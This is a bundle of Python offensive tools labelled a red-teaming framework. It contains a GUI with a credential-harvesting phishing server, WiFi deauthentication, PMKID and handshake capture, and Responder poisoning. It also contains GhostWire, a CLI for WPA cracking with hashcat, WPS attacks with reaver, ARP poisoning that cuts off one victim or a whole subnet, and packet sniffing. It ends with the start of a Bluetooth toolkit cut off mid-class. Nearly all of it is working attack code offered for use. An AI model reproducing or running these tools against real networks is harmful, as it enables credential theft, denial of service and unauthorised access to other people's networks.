#!/usr/bin/env python3
# NeuroPulse – Unified Red Teaming Framework

# ====== netwatch_matrix_gui_full.py ======
#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, filedialog
from ttkthemes import ThemedTk
import subprocess, threading, sqlite3, csv, http.server, socketserver

class NetwatchApp:
    def __init__(self):
        self.root = ThemedTk(theme="black")
        self.root.title("🛸 Netwatch Red Team Toolkit")
        self.root.geometry("1400x850")
        self.root.configure(bg="#000000")
        self.running_attacks = []

        self.db = sqlite3.connect("netwatch.db")
        self.init_db()

        style = ttk.Style(self.root)
        style.configure(".", background="#000", foreground="#00FF00", font=("Courier", 10))
        style.configure("TLabel", background="#000", foreground="#00FF00")
        style.configure("TButton", background="#111", foreground="#0f0", padding=5)
        style.map("TButton", background=[("active", "#00FF00")])

        self.logbox = tk.Text(self.root, height=10, bg="black", fg="#00FF00", insertbackground="#00FF00", font=("Courier", 10))
        self.logbox.pack(fill="x", padx=5, pady=5)

        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill="both", expand=True)

        self.tabs = {
            "🔧 Toolkit": ttk.Frame(self.notebook),
            "📁 Campaigns": ttk.Frame(self.notebook),
            "🔐 Credentials": ttk.Frame(self.notebook)
        }

        for name, frame in self.tabs.items():
            self.notebook.add(frame, text=name)

        self.build_toolkit_tab(self.tabs["🔧 Toolkit"])
        self.build_campaign_tab(self.tabs["📁 Campaigns"])
        self.build_creds_tab(self.tabs["🔐 Credentials"])

        self.root.protocol("WM_DELETE_WINDOW", self.on_close)
        self.root.mainloop()

    def build_toolkit_tab(self, tab):
        self.sidebar = tk.Frame(tab, bg="#0f0f0f", width=300)
        self.sidebar.pack(side="left", fill="y")

        self.statusbox = tk.Label(tab, text="Status: Idle", anchor="w", bg="#111", fg="#00ff99", height=2)
        self.statusbox.pack(fill="x", padx=10, pady=(5,10))

        self.content = tk.Frame(tab, bg="#0f0f0f")
        self.content.pack(side="right", expand=True, fill="both")

        self.inputs = {}
        for label in ["Interface", "BSSID", "Channel", "Target", "Options"]:
            ttk.Label(self.sidebar, text=label).pack(padx=10, pady=(10,0), anchor="w")
            entry = ttk.Entry(self.sidebar)
            entry.pack(padx=10, fill="x")
            self.inputs[label.lower()] = entry

        self.add_section("📶 Wireless Attacks", [
            ("📡 Deauth", self.run_deauth_attack),
            ("🔓 PMKID", self.run_pmkid_attack),
            ("📶 Handshake", self.run_handshake_capture)
        ])
        self.add_section("🌐 Network Attacks", [
            ("🔍 Nmap", self.run_nmap_scan),
            ("🎣 Responder", self.run_llmnr_poison)
        ])
        self.add_section("⚙️ Utilities", [
            ("🌀 Toggle Monitor Mode", self.toggle_monitor_mode),
            ("📤 Export Logs", self.export_logs_to_csv),
            ("🌐 Start Phish Server", self.run_phish_server)
        ])

    def add_section(self, title, buttons):
        frame = ttk.LabelFrame(self.sidebar, text=title)
        frame.pack(fill="x", padx=10, pady=10)
        for label, action in buttons:
            ttk.Button(frame, text=label, command=action).pack(pady=3, fill="x")

    def build_campaign_tab(self, tab):
        self.campaign_tree = ttk.Treeview(tab, columns=("email", "subject", "opened", "clicked", "payload"), show="headings")
        for col in self.campaign_tree["columns"]:
            self.campaign_tree.heading(col, text=col)
        self.campaign_tree.pack(fill="both", expand=True)
        self.refresh_campaigns()

    def build_creds_tab(self, tab):
        self.creds_tree = ttk.Treeview(tab, columns=("timestamp", "email", "password", "source"), show="headings")
        for col in self.creds_tree["columns"]:
            self.creds_tree.heading(col, text=col)
        self.creds_tree.pack(fill="both", expand=True)
        self.refresh_creds()

    def refresh_campaigns(self):
        cur = self.db.cursor()
        cur.execute("SELECT * FROM campaigns")
        rows = cur.fetchall()
        for i in self.campaign_tree.get_children():
            self.campaign_tree.delete(i)
        for row in rows:
            self.campaign_tree.insert("", "end", values=row)

    def refresh_creds(self):
        cur = self.db.cursor()
        cur.execute("SELECT * FROM credentials")
        rows = cur.fetchall()
        for i in self.creds_tree.get_children():
            self.creds_tree.delete(i)
        for row in rows:
            self.creds_tree.insert("", "end", values=row)

    def log(self, msg):
        self.logbox.insert("1.0", f"{msg}\n")
        cur = self.db.cursor()
        cur.execute("INSERT INTO logs VALUES (datetime('now'), ?, ?)", ("Log", msg))
        self.db.commit()

    def update_status(self, action):
        self.running_attacks.append(action)
        self.statusbox.config(text=" | ".join(self.running_attacks[-4:]))

    def init_db(self):
        cur = self.db.cursor()
        cur.execute("CREATE TABLE IF NOT EXISTS logs (timestamp TEXT, action TEXT, details TEXT)")
        cur.execute("CREATE TABLE IF NOT EXISTS credentials (timestamp TEXT, email TEXT, password TEXT, source TEXT)")
        cur.execute("CREATE TABLE IF NOT EXISTS campaigns (email TEXT, subject TEXT, opened TEXT, clicked TEXT, payload TEXT)")
        self.db.commit()

    def on_close(self):
        if getattr(self, "monitor_mode_enabled", False):
            iface = self.inputs["interface"].get()
            subprocess.call(["airmon-ng", "stop", iface + "mon"])
        self.log("🧹 Exiting and cleaning up...")
        self.root.destroy()

    def toggle_monitor_mode(self):
        iface = self.inputs["interface"].get()
        if not getattr(self, "monitor_mode_enabled", False):
            self.log(f"🌀 Enabling monitor mode on {iface}")
            subprocess.call(["airmon-ng", "start", iface])
            self.monitor_mode_enabled = True
        else:
            self.log(f"🛑 Disabling monitor mode on {iface}mon")
            subprocess.call(["airmon-ng", "stop", iface + "mon"])
            self.monitor_mode_enabled = False

    def export_logs_to_csv(self):
        path = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV files", "*.csv")])
        if path:
            cur = self.db.cursor()
            cur.execute("SELECT * FROM logs")
            with open(path, "w", newline="") as f:
                writer = csv.writer(f)
                writer.writerow(["Timestamp", "Action", "Details"])
                writer.writerows(cur.fetchall())
            self.log(f"✅ Logs exported to {path}")

    def run_deauth_attack(self):
        iface = self.inputs["interface"].get()
        bssid = self.inputs["bssid"].get()
        channel = self.inputs["channel"].get()

        def task():
            self.update_status("Deauth")
            self.log(f"⚡ Deauth {bssid}@ch{channel}")
            subprocess.call(["iwconfig", iface + "mon", "channel", channel])
            subprocess.call(["aireplay-ng", "--deauth", "1000", "-a", bssid, iface + "mon"])
        threading.Thread(target=task, daemon=True).start()

    def run_pmkid_attack(self):
        iface = self.inputs["interface"].get()
        def task():
            self.update_status("PMKID")
            self.log(f"🔓 PMKID on {iface}")
            subprocess.call(["hcxdumptool", "-i", iface, "-o", "pmkid.pcapng", "--enable_status=15"])
        threading.Thread(target=task, daemon=True).start()

    def run_handshake_capture(self):
        iface = self.inputs["interface"].get()
        bssid = self.inputs["bssid"].get()
        channel = self.inputs["channel"].get()
        def task():
            self.update_status("Handshake")
            self.log(f"📶 Handshake {bssid}@ch{channel}")
            subprocess.call(["airodump-ng", "--bssid", bssid, "--channel", channel, "--write", "handshake", iface])
        threading.Thread(target=task, daemon=True).start()

    def run_nmap_scan(self):
        target = self.inputs["target"].get()
        options = self.inputs["options"].get()
        def task():
            self.update_status("Nmap")
            self.log(f"🔍 Scanning {target} {options}")
            result = subprocess.getoutput(f"nmap {options} {target}")
            self.log(result)
        threading.Thread(target=task, daemon=True).start()

    def run_llmnr_poison(self):
        iface = self.inputs["interface"].get()
        def task():
            self.update_status("Responder")
            self.log(f"🎣 Responder on {iface}")
            subprocess.call(["responder", "-I", iface, "-wrf"])
        threading.Thread(target=task, daemon=True).start()

    def run_phish_server(self):
        class PhishHandler(http.server.SimpleHTTPRequestHandler):
            def do_POST(self):
                length = int(self.headers["Content-Length"])
                data = self.rfile.read(length).decode()
                try:
                    email = data.split("email=")[1].split("&")[0]
                    password = data.split("password=")[1]
                except:
                    email, password = "unknown", "unknown"
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"<h1>Login failed</h1>")
                cur = self.server.app.db.cursor()
                cur.execute("INSERT INTO credentials VALUES (datetime('now'), ?, ?, ?)", (email, password, "phish"))
                self.server.app.db.commit()
                self.server.app.refresh_creds()
                self.server.app.log(f"🪪 Phished: {email}:{password}")

        def task():
            PORT = 8080
            with socketserver.TCPServer(("", PORT), PhishHandler) as httpd:
                httpd.app = self
                self.log(f"🌐 Phishing server running on http://0.0.0.0:{PORT}")
                httpd.serve_forever()

        threading.Thread(target=task, daemon=True).start()

if __name__ == "__main__":
    NetwatchApp()

# ====== ghostwire.py ======
#!/usr/bin/env python3
"""
GhostWire – Tactical WiFi Penetration
Author  : Null_Lyfe
License : MIT
"""

from __future__ import annotations

import argparse
import csv
import ipaddress
import json
import logging
import os
import random
import re
import shutil
import signal
import subprocess
import sys
import tempfile
import time
import urllib.request
from datetime import datetime
from pathlib import Path
from subprocess import DEVNULL, PIPE, STDOUT, CalledProcessError, Popen
from threading import Thread
from typing import Iterable, List, Optional, Sequence, Tuple

# ── optional stubs for CI (set GW_TEST_STUB=1) ─────────────────────────
if os.getenv("GW_TEST_STUB") == "1":  # pragma: no cover
    import types

    for _m in (
        "rich",
        "rich.console",
        "rich.panel",
        "rich.table",
        "rich.progress",
        "rich.live",
        "rich.text",
        "rich.align",
        "scapy",
        "scapy.all",
    ):
        sys.modules[_m] = types.ModuleType(_m)

from rich import print as rprint  # type: ignore
from rich.console import Console  # type: ignore
from rich.align import Align  # type: ignore
from rich.live import Live  # type: ignore
from rich.panel import Panel  # type: ignore
from rich.progress import (  # type: ignore
    BarColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)
from rich.table import Table  # type: ignore
from scapy.all import (  # type: ignore
    ARP,
    Ether,
    get_if_hwaddr,
    send,
    sniff,
    srp,
    wrpcap,
)

console = Console()

NEON_GREEN = "[bright_green]"
NEON_RED = "[bold red]"
_QUOTES = [
    "Obscurity isn’t security; vigilance is.",
    "The quieter you become, the more you hear.",
    "Amateurs hack systems; pros hack people.",
    "Those who sow packets reap the wind.",
    "Hack the planet… ethically.",
    "In silence we own the spectrum.",
    "Data in motion is data at risk.",
    "Every beacon frame is a confession.",
    "Packets never lie.",
    "Trust is just another vulnerability.",
    "Signal is free; control is earned.",
    "Know the air, own the link.",
    "0 dB today; root tomorrow.",
    "Your MAC address is showing.",
    "Encryption ends where social starts.",
    "Audit twice, deploy once.",
    "The RF gods reward patience.",
    "All 1s and 0s eventually talk.",
    "Interfaces are the new front doors.",
    "Pwn responsibly.",
]

# ── paths & logging ────────────────────────────────────────────────────
LOG_DIR = Path.home() / ".ghostwire"
LOG_DIR.mkdir(exist_ok=True)
KEY_CSV = LOG_DIR / "cracked_keys.csv"
OUI_PATH = LOG_DIR / "oui.txt"
OUI_URL = "https://standards-oui.ieee.org/oui/oui.txt"

logging.basicConfig(
    filename=LOG_DIR / "ghostwire.log",
    level=logging.INFO,
    format="%(asctime)s %(levelname)s: %(message)s",
)

ACTIVE_MON: set[str] = set()
POISON_PAIRS: set[Tuple[str, str, str]] = set()
LAST_SCAN: List[dict] = []

# ── subprocess helpers ─────────────────────────────────────────────────
def run_cmd(
    cmd: Sequence[str],
    *,
    capture: bool = False,
    allow_fail: bool = False,
) -> str | None:
    """Run external command."""
    logging.info("RUN %s", " ".join(cmd))
    try:
        proc = Popen(
            cmd,
            stdout=PIPE if capture else DEVNULL,
            stderr=PIPE if capture else DEVNULL,
            text=True,
        )
        out, err = proc.communicate()
    except FileNotFoundError:
        sys.exit(f"{NEON_RED}✘ {cmd[0]} not found.[/]")
    if proc.returncode and not allow_fail:
        rprint(f"{NEON_RED}✘ Failed: {' '.join(cmd)}[/]")
        if err:
            logging.error(err.strip())
        sys.exit(1)
    return out if capture else None


def run_with_progress(cmd: Sequence[str], desc: str, total: int | None = None) -> None:
    """Run long command with Rich progress bar."""
    with Progress(
        SpinnerColumn(style="purple"),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=None) if total else None,
        TextColumn("{task.percentage:>3.0f}%") if total else None,
        TimeElapsedColumn(),
    ) as prog:
        tid = prog.add_task(desc, total=total or 1)
        proc = Popen(cmd, stdout=PIPE, stderr=STDOUT, text=True, bufsize=1)
        for line in proc.stdout:  # type: ignore
            if total and "%" in line:
                try:
                    pct = float(line.split("%")[0].split()[-1])
                    prog.update(tid, completed=pct)
                except ValueError:
                    pass
        proc.wait()
        if proc.returncode and not allow_fail:
            raise CalledProcessError(proc.returncode, cmd)
        prog.update(tid, completed=total or 1)


# ── root / deps / iface detection ──────────────────────────────────────
def require_root() -> None:
    if os.geteuid() != 0:
        sys.exit(f"{NEON_RED}✘ Root privileges required.[/]")


def check_deps(bins: Iterable[str]) -> None:
    missing = [b for b in bins if shutil.which(b) is None]
    if missing:
        sys.exit(f"{NEON_RED}✘ Missing tools:[/] " + ", ".join(missing))


def detect_wifi_iface() -> str:
    for dev in Path("/sys/class/net").iterdir():
        if (dev / "wireless").exists():
            return dev.name
    out = run_cmd(["iw", "dev"], capture=True, allow_fail=True) or ""
    for ln in out.splitlines():
        if "Interface" in ln:
            return ln.split()[-1]
    sys.exit(f"{NEON_RED}✘ No wireless interface detected.[/]")


# ── monitor helpers ────────────────────────────────────────────────────
def _iface_exists(name: str) -> bool:
    return Path(f"/sys/class/net/{name}").exists()


def enable_monitor(iface: str) -> str:
    out = run_cmd(["airmon-ng", "start", iface], capture=True, allow_fail=True) or ""
    m = re.search(r"\bon\s+([A-Za-z0-9_]+mon)\b", out)
    mon = m.group(1) if m else iface + "mon"
    if not _iface_exists(mon):  # fallback
        run_cmd(["ip", "link", "set", iface, "down"], allow_fail=True)
        run_cmd(["iw", iface, "set", "monitor", "control"], allow_fail=True)
        run_cmd(["ip", "link", "set", iface, "up"], allow_fail=True)
        mon = iface
    ACTIVE_MON.add(mon)
    rprint(f"{NEON_GREEN}✔ Monitor mode enabled → {mon}[/]")
    return mon


def disable_monitor(iface: str) -> None:
    if not _iface_exists(iface):
        return
    if subprocess.call(["airmon-ng", "stop", iface], stdout=DEVNULL, stderr=DEVNULL):
        run_cmd(["ip", "link", "set", iface, "down"], allow_fail=True)
        run_cmd(["iw", "dev", iface, "del"], allow_fail=True)
    ACTIVE_MON.discard(iface)


def start_monitor(iface: str | None) -> str:
    return enable_monitor(iface or detect_wifi_iface())


def stop_monitor(iface: str | None) -> None:
    if not iface and ACTIVE_MON:
        iface = next(iter(ACTIVE_MON))
    if iface:
        disable_monitor(iface)


# ── OUI helpers ────────────────────────────────────────────────────────
_OUI_MAP: dict[str, str] | None = None


def _ensure_oui(force: bool = False) -> None:
    if not force and OUI_PATH.exists() and (
        time.time() - OUI_PATH.stat().st_mtime
    ) < 7 * 24 * 3600:
        return
    console.print("[cyan]↻ Fetching latest OUI registry …[/]")
    with urllib.request.urlopen(OUI_URL, timeout=15) as resp, OUI_PATH.open(
        "wb"
    ) as dst:
        shutil.copyfileobj(resp, dst)


def vendor_lookup(mac: str) -> str:
    global _OUI_MAP
    if _OUI_MAP is None:
        _ensure_oui()
        _OUI_MAP = {}
        rgx = re.compile(r"^([0-9A-F]{6})\s+\(base 16\)\s+(.+)$")
        with OUI_PATH.open() as fh:
            for ln in fh:
                m = rgx.match(ln.strip())
                if m:
                    _OUI_MAP[m.group(1)] = m.group(2).strip()
    oui = mac.upper().replace(":", "")[:6]
    return _OUI_MAP.get(oui, "—")


# ── Wi-Fi CSV scan ─────────────────────────────────────────────────────
def scan_networks(iface: str, seconds: int = 15) -> List[dict]:
    tmp = Path(tempfile.mkdtemp(prefix="gwscan_"))
    base = tmp / "scan"
    proc = subprocess.Popen(
        [
            "airodump-ng",
            "--write-interval",
            "1",
            "--output-format",
            "csv",
            "-w",
            str(base),
            iface,
        ],
        stdout=DEVNULL,
        stderr=DEVNULL,
    )
    time.sleep(seconds)
    proc.terminate()
    proc.wait()
    csv_file = next(tmp.glob("scan-*.csv"), None)
    nets: List[dict] = []
    if csv_file:
        with csv_file.open(newline="") as fh:
            rdr = csv.reader(fh)
            parsing = False
            for row in rdr:
                if not row:
                    continue
                if row[0].startswith("Station"):
                    break
                if row[0] == "BSSID":
                    parsing = True
                    continue
                if parsing and len(row) >= 14:
                    nets.append(
                        {
                            "bssid": row[0].strip(),
                            "power": int(row[8].strip() or -99),
                            "channel": row[3].strip(),
                            "enc": row[5].strip(),
                            "ssid": row[13].strip(),
                        }
                    )
    return sorted(nets, key=lambda d: d["power"], reverse=True)


# ── hashcat helpers / Wi-Fi attacks / sniffer / LAN / scans (unchanged) ─
def _to_22000(cap: str) -> Path:
    out = Path(cap).with_suffix(".22000")
    run_cmd(["hcxpcapngtool", "-o", out, cap])
    return out


def auto_crack(cap: str, wordlist: str) -> None:
    h = _to_22000(cap)
    run_with_progress(
        [
            "hashcat",
            "--status",
            "--status-json",
            "-m",
            "22000",
            "-a",
            "0",
            h,
            wordlist,
            "--force",
        ],
        "Hashcat crack",
        total=100,
    )
    show = run_cmd(["hashcat", "--show", "-m", "22000", h], capture=True) or ""
    rows = []
    for ln in show.splitlines():
        parts = ln.split("*")
        if len(parts) >= 3:
            rows.append((parts[1], parts[-1]))
    show_keys(rows)


def wifi_scan_raw(iface: str) -> None:
    run_cmd(["airodump-ng", iface])


def capture_handshake(
    iface: str, bssid: str, ch: str, wordlist: str | None = None
) -> None:
    run_with_progress(
        ["airodump-ng", "-c", ch, "--bssid", bssid, "-w", "handshake", iface],
        "Capturing handshake",
    )
    if wordlist:
        auto_crack("handshake-01.cap", wordlist)


def pmkid_capture(iface: str, wordlist: str | None = None) -> None:
    run_with_progress(
        ["hcxdumptool", "-i", iface, "-o", "pmkid.pcapng"], "Capturing PMKID"
    )
    if wordlist:
        auto_crack("pmkid.pcapng", wordlist)


def wps_attack(iface: str, bssid: str, ch: str) -> None:
    out = run_cmd(
        ["reaver", "-i", iface, "-b", bssid, "-c", ch, "-vv"], capture=True
    )
    pin = psk = None
    for ln in out.splitlines():
        if "WPS PIN:" in ln:
            pin = ln.split(":")[-1].strip()
        if "PSK:" in ln:
            psk = ln.split(":")[-1].strip()
    show_keys([(bssid, psk or pin or "?")])


def _make_dash(total: int, rate: float) -> Table:
    t = Table.grid()
    t.add_column("Metric", style="cyan", justify="right")
    t.add_column("Value")
    t.add_row("Packets", str(total))
    t.add_row("Rate pkt/s", f"{rate:0.1f}")
    return t


def sniff_packets(iface: str, count: int, bpf: str | None, save: str | None) -> None:
    pkts: list = []
    proto = dict(ARP=0, TCP=0, UDP=0, IP=0, OTHER=0)
    start = time.time()

    def _upd(pkt):
        pkts.append(pkt)
        if pkt.haslayer("ARP"):
            proto["ARP"] += 1
        elif pkt.haslayer("TCP"):
            proto["TCP"] += 1
        elif pkt.haslayer("UDP"):
            proto["UDP"] += 1
        elif pkt.haslayer("IP"):
            proto["IP"] += 1
        else:
            proto["OTHER"] += 1
        live.update(_make_dash(len(pkts), len(pkts) / (time.time() - start + 1e-9)))

    console.rule("[bright_magenta]Sniffing – Ctrl-C to stop")
    with Live(_make_dash(0, 0), console=console, refresh_per_second=2) as live:
        try:
            sniff(
                iface=iface,
                prn=_upd,
                filter=bpf,
                count=count if count else 0,
            )
        except KeyboardInterrupt:
            pass
    if save:
        wrpcap(save, pkts)
        rprint(f"{NEON_GREEN}✔ Saved {len(pkts)} packets → {save}[/]")
    tbl = Table(title="Protocol Distribution", header_style="bright_magenta")
    tbl.add_column("Proto")
    tbl.add_column("#", style="cyan")
    for p, n in proto.items():
        if n:
            tbl.add_row(p, str(n))
    console.print(tbl)


def port_scan(target: str, top: int, udp: bool) -> None:
    flag = "-sU" if udp else "-sS"
    out = run_cmd(
        ["nmap", "-T4", flag, f"--top-ports={top}", target], capture=True
    )
    tbl = Table(title=f"Open Ports on {target}", header_style="bright_magenta")
    tbl.add_column("Port/Proto", style="cyan")
    tbl.add_column("Service")
    rec = False
    for ln in out.splitlines():
        if ln.startswith("PORT"):
            rec = True
            continue
        if rec and ln.strip() and not ln.startswith("Nmap done"):
            port, state, service, *_ = ln.split()
            if state == "open":
                tbl.add_row(port, service)
    console.print(tbl)


def nmap_scan(target: str, opts: str) -> None:
    out = run_cmd(["nmap", *opts.split(), target], capture=True)
    console.rule(f"[bright_magenta]nmap results for {target}")
    console.print(out)


def lan_scan(subnet: str) -> None:
    net = ipaddress.ip_network(subnet, strict=False)
    ans, _ = srp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(net)),
        timeout=2,
        retry=1,
        verbose=False,
    )
    tbl = Table(show_header=True, header_style="bright_magenta")
    tbl.add_column("IP", style="cyan")
    tbl.add_column("MAC")
    tbl.add_column("Vendor")
    for _, r in ans:
        tbl.add_row(r.psrc, r.hwsrc, vendor_lookup(r.hwsrc))
    console.print(tbl)


def _restore_arp(v: str, g: str, i: str) -> None:
    send(ARP(op=2, pdst=v, psrc=g), count=5, iface=i, verbose=False)
    send(ARP(op=2, pdst=g, psrc=v), count=5, iface=i, verbose=False)


def _poison(v: str, g: str, i: str) -> None:
    hw = get_if_hwaddr(i)
    p1 = ARP(op=2, pdst=v, psrc=g, hwsrc=hw)
    p2 = ARP(op=2, pdst=g, psrc=v, hwsrc=hw)
    try:
        while True:
            send(p1, iface=i, verbose=False)
            send(p2, iface=i, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        _restore_arp(v, g, i)
        raise


def kick(v: str, g: str, i: str) -> None:
    POISON_PAIRS.add((v, g, i))
    _poison(v, g, i)


def kickall(subnet: str, g: str, i: str) -> None:
    for ip in ipaddress.ip_network(subnet, strict=False).hosts():
        POISON_PAIRS.add((str(ip), g, i))
        Thread(target=_poison, args=(str(ip), g, i), daemon=True).start()
    rprint("[purple]✜ ARP flood running – Ctrl-C to stop[/]")
    signal.pause()


# ── cracked-key display ───────────────────────────────────────────────
def show_keys(rows: List[Tuple[str, str]]) -> None:
    if not rows:
        rprint(f"{NEON_RED}✘ No keys cracked.[/]")
        return
    new = not KEY_CSV.exists()
    with KEY_CSV.open("a", newline="") as f:
        wr = csv.writer(f)
        if new:
            wr.writerow(("timestamp", "target", "key"))
        ts = datetime.now().isoformat(timespec="seconds")
        for t, k in rows:
            wr.writerow((ts, t, k))
    tbl = Table(title="Cracked Keys", header_style="bright_magenta")
    tbl.add_column("Target")
    tbl.add_column("Key/PIN", style="bright_green")
    for t, k in rows:
        tbl.add_row(t, k)
    console.print(tbl)


# ── cleanup ───────────────────────────────────────────────────────────
def _cleanup(_sig: int | None = None, _f=None):
    for mon in list(ACTIVE_MON):
        disable_monitor(mon)
    for v, g, i in list(POISON_PAIRS):
        _restore_arp(v, g, i)
    if _sig is not None:
        console.print("\n[cyan]↩ Cleanup complete.[/]")
        sys.exit(0)


signal.signal(signal.SIGINT, _cleanup)
import atexit

atexit.register(_cleanup)

# ── UI helpers ─────────────────────────────────────────────────────────
def _banner() -> None:
    title = "[b bright_magenta]GHOSTWIRE[/]"
    subtitle = "[white]created by [bright_cyan]Null_Lyfe[/]"
    body = Align.center(f"{title}\n{subtitle}\n{random.choice(_QUOTES)}", vertical="middle")
    console.print(Panel(body, border_style="cyan", padding=(1, 8)))


def _menu() -> None:
    g = Table.grid(padding=(0, 2))
    g.add_row("1) Start monitor", "8) Packet sniff")
    g.add_row("2) Stop monitor", "9) LAN scan")
    g.add_row("3) Wi-Fi scan/list", "10) Port scan")
    g.add_row("4) Capture handshake", "11) nmap custom")
    g.add_row("5) Capture PMKID", "12) Kick victim")
    g.add_row("6) WPS attack", "13) Kick ALL")
    g.add_row("7) Crack capture", "14) Refresh OUI DB")
    g.add_row("0) Quit", "")
    console.print(
        Panel(
            g,
            title="[bright_magenta]Main Menu[/]",
            border_style="bright_magenta",
        )
    )


def interactive() -> None:
    global LAST_SCAN
    while True:
        _menu()
        ch = console.input("[bright_green]› [/]").strip()

        if ch == "1":
            start_monitor(console.input("Interface(blank=auto)> ").strip() or None)

        elif ch == "2":
            stop_monitor(console.input("Interface(blank=auto)> ").strip() or None)

        elif ch == "3":  # Wi-Fi scan
            mon = start_monitor(None)
            LAST_SCAN = scan_networks(mon, 15)
            stop_monitor(mon)
            tbl = Table(title="Nearby APs", header_style="bright_magenta")
            tbl.add_column("#")
            tbl.add_column("BSSID")
            tbl.add_column("Ch")
            tbl.add_column("Pwr")
            tbl.add_column("Enc")
            tbl.add_column("SSID")
            for idx, n in enumerate(LAST_SCAN, 1):
                tbl.add_row(
                    str(idx),
                    n["bssid"],
                    n["channel"],
                    str(n["power"]),
                    n["enc"],
                    n["ssid"],
                )
            console.print(tbl)

        elif ch in ("4", "5", "6"):
            if not LAST_SCAN:
                console.print("[red]Run scan first (option 3)[/]")
                continue
            idx = int(console.input("Pick # from scan > ")) - 1
            if idx < 0 or idx >= len(LAST_SCAN):
                continue
            t = LAST_SCAN[idx]
            mon = start_monitor(None)
            if ch == "4":
                capture_handshake(
                    mon,
                    t["bssid"],
                    t["channel"],
                    console.input("Wordlist(blank=skip)> ") or None,
                )
            elif ch == "5":
                pmkid_capture(
                    mon, console.input("Wordlist(blank=skip)> ") or None
                )
            else:
                wps_attack(mon, t["bssid"], t["channel"])
            stop_monitor(mon)

        elif ch == "7":
            auto_crack(
                console.input("Capture file > "),
                console.input("Wordlist > "),
            )

        elif ch == "8":
            sniff_packets(
                console.input("Iface(blank=auto)> ").strip() or detect_wifi_iface(),
                int(console.input("Count(0=∞)> ") or "0"),
                console.input("BPF > ").strip() or None,
                console.input("Save pcap(blank=skip)> ").strip() or None,
            )

        elif ch == "9":
            lan_scan(console.input("Subnet e.g. 192.168.1.0/24 > "))

        elif ch == "10":
            port_scan(
                console.input("Target > ").strip(),
                int(console.input("Top N[100]> ") or "100"),
                console.input("UDP scan? (y/N) > ").lower().startswith("y"),
            )

        elif ch == "11":
            nmap_scan(
                console.input("Target > ").strip(),
                console.input('Opts "-sV -A -Pn" > ').strip() or "-sV -T4",
            )

        elif ch == "12":
            kick(
                console.input("Victim IP > "),
                console.input("Gateway IP > "),
                console.input("Iface(blank=auto)> ").strip() or detect_wifi_iface(),
            )

        elif ch == "13":
            kickall(
                console.input("Subnet > "),
                console.input("Gateway IP > "),
                console.input("Iface(blank=auto)> ").strip() or detect_wifi_iface(),
            )

        elif ch == "14":
            _ensure_oui(force=True)
            console.print("[bright_green]✔ OUI database refreshed.[/]")

        elif ch == "0":
            _cleanup()
            sys.exit(0)


# ── CLI parser ────────────────────────────────────────────────────────
def build_cli() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog="ghostwire", add_help=False)
    sub = p.add_subparsers(dest="cmd")

    wifi = sub.add_parser("wifi")
    wifi.add_argument("action", choices=["scan", "handshake", "pmkid", "wps"])
    wifi.add_argument("-i", "--iface")
    wifi.add_argument("--bssid")
    wifi.add_argument("--channel")
    wifi.add_argument("--wordlist")

    lan = sub.add_parser("lan")
    lan.add_argument("action", choices=["scan", "kick", "kickall"])
    lan.add_argument("subnet_or_ip")
    lan.add_argument("--gateway")
    lan.add_argument("-i", "--iface")

    sniffp = sub.add_parser("sniff")
    sniffp.add_argument("-i", "--iface")
    sniffp.add_argument("--count", type=int, default=0)
    sniffp.add_argument("--bpf")
    sniffp.add_argument("--save")

    portp = sub.add_parser("ports")
    portp.add_argument("target")
    portp.add_argument("--top", type=int, default=100)
    portp.add_argument("--udp", action="store_true")

    nm = sub.add_parser("nmap")
    nm.add_argument("target")
    nm.add_argument("--opts", default="-sV -T4")

    crack = sub.add_parser("crack")
    crack.add_argument("capture")
    crack.add_argument("wordlist")

    mon = sub.add_parser("monitor")
    mon.add_argument("action", choices=["start", "stop"])
    mon.add_argument("-i", "--iface")

    oui = sub.add_parser("oui")
    oui.add_argument("--force", action="store_true")

    return p


# ── main entry ─────────────────────────────────────────────────────────
def main() -> None:
    require_root()
    _banner()
    check_deps(
        [
            "airmon-ng",
            "airodump-ng",
            "hcxdumptool",
            "hcxpcapngtool",
            "hashcat",
            "reaver",
            "nmap",
            "iw",
        ]
    )
    args = build_cli().parse_args()
    if args.cmd is None:
        interactive()
        return

    if args.cmd == "wifi":
        mon = start_monitor(args.iface)
        try:
            if args.action == "scan":
                wifi_scan_raw(mon)
            elif args.action == "handshake":
                if not (args.bssid and args.channel):
                    sys.exit("handshake needs --bssid & --channel")
                capture_handshake(mon, args.bssid, args.channel, args.wordlist)
            elif args.action == "pmkid":
                pmkid_capture(mon, args.wordlist)
            elif args.action == "wps":
                if not (args.bssid and args.channel):
                    sys.exit("wps needs --bssid & --channel")
                wps_attack(mon, args.bssid, args.channel)
        finally:
            stop_monitor(mon)

    elif args.cmd == "lan":
        iface = args.iface or detect_wifi_iface()
        if args.action == "scan":
            lan_scan(args.subnet_or_ip)
        elif args.action == "kick":
            if not args.gateway:
                sys.exit("kick needs --gateway")
            kick(args.subnet_or_ip, args.gateway, iface)
        elif args.action == "kickall":
            if not args.gateway:
                sys.exit("kickall needs --gateway")
            kickall(args.subnet_or_ip, args.gateway, iface)

    elif args.cmd == "sniff":
        sniff_packets(args.iface or detect_wifi_iface(), args.count, args.bpf, args.save)

    elif args.cmd == "ports":
        port_scan(args.target, args.top, args.udp)

    elif args.cmd == "nmap":
        nmap_scan(args.target, args.opts)

    elif args.cmd == "crack":
        auto_crack(args.capture, args.wordlist)

    elif args.cmd == "monitor":
        if args.action == "start":
            start_monitor(args.iface)
        else:
            stop_monitor(args.iface)

    elif args.cmd == "oui":
        _ensure_oui(force=args.force)
        console.print("[bright_green]✔ OUI database up-to-date.[/]")


if __name__ == "__main__":
    main()

# ====== zerosyncV8.1.py ======
#!/usr/bin/env python3
"""
ZeroSync v8.0 – Cyberpunk Bluetooth Toolkit
Created by Null_Lyfe
"""

import os
import sys
import time
import random
import subprocess
from datetime import datetime
from bluepy.btle import Scanner, Peripheral, DefaultDelegate, BTLEException, ADDR_TYPE_PUBLIC, ADDR_TYPE_RANDOM
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt
from rich import box

console = Console()
seen_devices = {}

class BLEHandler(DefaultDelegate):
